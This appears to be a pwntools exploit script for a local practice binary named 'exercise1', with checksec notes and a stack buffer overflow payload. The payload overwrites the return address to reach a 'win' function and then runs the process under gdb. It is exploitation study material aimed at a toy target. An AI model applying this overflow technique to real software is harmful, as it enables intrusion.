#exercise1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a41cddeb6f1f325a33d7e6260c4004593b2288ba, for GNU/Linux 3.2.0, not stripped
    #Arch:     i386-32-little
    #RELRO:    Partial RELRO
    #Stack:    No canary found
    #NX:       NX enabled
    #PIE:      No PIE (0x8048000)

#environment variables and argv may change the main ebp address on the stack, which complicates return to it with static value, stack start is randomized by aslr even though NoPie


from pwn import *

offset = 100
ret_win = p32(0x080491db)
ret_main = p32(0x0804928b)
ret_ebp = p32(0xffffce18)

payload = b'A' * (offset-1) + b'\x00' + b'\x00' * 12 + ret_win + ret_ebp + ret_main
p = process('./exercise1')
gdb.attach(p,'''
finish
finish
finish
finish
finish
until *vuln+52
''')
p.sendline(payload)   
p.interactive()